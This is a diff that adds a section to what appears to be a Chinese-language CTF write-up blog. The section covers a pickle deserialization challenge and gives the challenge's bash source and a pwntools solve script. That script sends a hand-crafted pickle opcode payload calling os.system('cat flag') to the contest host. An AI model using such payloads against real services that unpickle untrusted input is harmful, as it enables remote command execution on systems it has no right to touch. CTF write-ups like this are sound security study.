@@ -286,6 +286,7 @@
             <li><a href="#week4-webshell">[Week4] Webshell</a></li>
             <li><a href="#week4-二维码2-阿喀琉斯之踵">[Week4] 二维码2-阿喀琉斯之踵</a></li>
             <li><a href="#week4-小cheny的社交">[Week4] 小cheny的社交</a></li>
+            <li><a href="#pickle-init-week3-week4">Pickle Init [Week3] [Week4]</a></li>
           </ol>
         </li>
       </ol>
@@ -735,7 +736,54 @@
 ></p>
 <p>进入链接博客又发现尊嘟假嘟编码，这里解码得到后半flag[](<a class="link" href="https://www.zdjd.asia/"  target="_blank" rel="noopener"
     >尊嘟假嘟O.o (zdjd.asia)</a>)</p>
-
+<hr>
+<h4 id="pickle-init-week3-week4">Pickle Init [Week3] [Week4]
+</h4><p>学习文章，我也不会opcode</p>
+<p><a class="link" href="https://goodapple.top/archives/1069"  target="_blank" rel="noopener"
+    >Pickle反序列化 - 枫のBlog (goodapple.top)</a></p>
+<p>题目源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">GZCTF_FLAG</span><span class="si">}</span><span class="s2">&#34;</span> &gt; /flag
+</span></span><span class="line"><span class="cl">python3 -c <span class="s2">&#34;__import__(&#39;pickle&#39;).loads(__import__(&#39;sys&#39;).stdin.read(50).encode(&#39;ASCII&#39;))&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>贴个脚本，用pwntools发的，不然不好填50字节</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">r1</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;&#34;cos
+</span></span></span><span class="line"><span class="cl"><span class="s2">system
+</span></span></span><span class="line"><span class="cl"><span class="s2">(S&#39;cat flag&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s2">tR.&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;challenge.basectf.fun&#39;</span><span class="p">,</span><span class="mi">41751</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">r1</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>	<span class="c1">#从左边填充0</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
 </section>
 
 
